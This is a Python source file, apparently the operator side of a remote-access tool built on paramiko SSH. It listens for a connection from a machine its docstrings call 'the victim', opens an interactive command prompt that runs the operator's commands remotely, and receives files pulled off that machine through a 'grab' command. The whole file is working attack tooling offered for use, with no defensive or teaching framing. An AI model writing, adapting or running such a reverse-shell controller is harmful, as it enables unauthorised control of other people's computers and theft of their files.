import argparse
import socket
import sys
import threading

import paramiko


class Server (paramiko.ServerInterface):
    def __init__(self, username, password, port, rsa_key_path=None):
        self.ip = socket.gethostbyname('0.0.0.0')
        self.port = port if port else 22
        self.username = username
        self.password = password
        self.event = threading.Event()
        if rsa_key_path is None:
            self.host_key = paramiko.RSAKey.generate(2048)
        else:
            self.host_key = paramiko.RSAKey(filename=rsa_key_path)

    def check_channel_request(self, kind, chanid):
        if kind == 'session':
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED

    def check_auth_password(self, username, password):
        if (username == self.username) and (password == self.password):
            return paramiko.AUTH_SUCCESSFUL
        return paramiko.AUTH_FAILED

    def create_start_listen_connection(self):
        '''
        Create a new socket, bind to address and enable the server to accept connections.
        '''
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # allow to bind an IP address that previously connected and left the socket in TIME_WAIT
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            sock.bind((self.ip, self.port))
            sock.listen(10)
            return sock
        except Exception as e:
            print(e)
            sock.close()
            sys.exit(1)

    def establish_connection(self, sock):
        '''
        Wait for incoming requests to establish an SSH tunnel on the top of the TCP socket.
        '''
        while True:
            print(f'[+] Waiting connection (port: {self.port})...')
            client, addr = sock.accept()
            print('[+] Got a connection:', addr)
            t = paramiko.Transport(client)
            if not t.load_server_moduli():
                print('(-) Failed to load moduli (group-exchange will be unsupported)')
            t.add_server_key(self.host_key)
            try:
                t.start_server(server=self)
            except paramiko.SSHException:
                print('[-] SSH negotiation failed.')
            chan = t.accept(20)
            if chan is None:
                print('[-] No authenticated or timeout is over\n')
            else:
                print('[+] Authenticated')
                sock.close()
                break

        # check connection communication
        chan.sendall('ok')
        client_platform = chan.recv(16).decode('utf-8')

        # if OS is Windows -> change cp
        print(f'platform: {client_platform}\n')
        if client_platform.startswith('win'):
            try:
                set_cp(chan)
            except Exception:
                print('failed change code page')

        return chan, t


def get_args():
    '''Parse args at startup.
    '''
    parser = argparse.ArgumentParser(description='Server')
    parser.add_argument('un', help='the username to establish ssh connection')
    parser.add_argument('ps', help='the password to establish ssh connection')
    parser.add_argument('-p', '--port', type=int, help='the ssh port, 1234 by default')
    return parser.parse_args()


def set_cp(chan, cp=866):
    '''Changes the current Windows code page.
    '''
    chan.send(f'chcp {cp}')
    print(chan.recv(128).decode('cp866'))


def read_incoming_file(channel, filename, filesize):
    '''
    Reads the file through the channel and writes it to the current directory.
    '''
    with open(filename, 'wb') as file_to_write:
        chunksize = 4096
        while filesize > 0:
            if filesize < chunksize:
                chunksize = filesize
            data = channel.recv(chunksize)
            file_to_write.write(data)
            filesize -= len(data)


def get_files(chan):
    '''
    Try to receive files from the victim.
    '''
    count = 0
    try:
        while True:
            size = chan.recv(16)     # filename length is limitted.
            if b'+' in size:
                if size == b'+':
                    print(f'[+]: Done ({chan.recv(32)})')
                else:
                    print(size)
                return
            size = int(size, 2)
            filename = chan.recv(size)
            filesize = chan.recv(32)
            filesize = int(filesize, 2)
            read_incoming_file(chan, filename, filesize)
            count += 1
            print(f"[{count}]: File({filename}) received")
    except Exception as e:
        print(e)
        return


def take_control(chan, ssh_t):
    '''
    Start sending commands through the ssh tunnel to the victim.
    '''
    getting_file_errors = {
        b'2': 'invalid path', b'3': 'no such file',
        b'1': 'some problems', b'4': 'invalid grab command (usage: grab path [file])'
    }
    ip, port = ssh_t.getpeername()
    while True:
        command = input(f"@{ip}:~$")
        if not command:
            continue
        elif command == 'port':
            print(port)
            continue
        chan.sendall(command)
        if 'grab' in command:
            status = chan.recv(1)
            if status == b'0':
                get_files(chan)
            else:
                print(getting_file_errors[status])
        elif command == 'server stop':
            ssh_t.close()   # close all channels are tied to it
            sys.exit(0)
        else:
            info = chan.recv(4096)
            try:
                print(info.decode('utf-8'))
            except Exception:
                # windows
                print(info.decode('cp866'))


def main():
    # parse args
    args = get_args()

    # create server
    server = Server(args.un, args.ps, args.port)

    # create socket and start listening port
    sock = server.create_start_listen_connection()

    try:
        # establish connection
        chan, t = server.establish_connection(sock)

        # start command cycle
        take_control(chan, t)

    except Exception as e:
        print(e.__class__.__name__ + ': ' + str(e))
        try:
            t.close()
        except Exception as e:
            print(e)
        sys.exit(1)


if __name__ == "__main__":
    main()
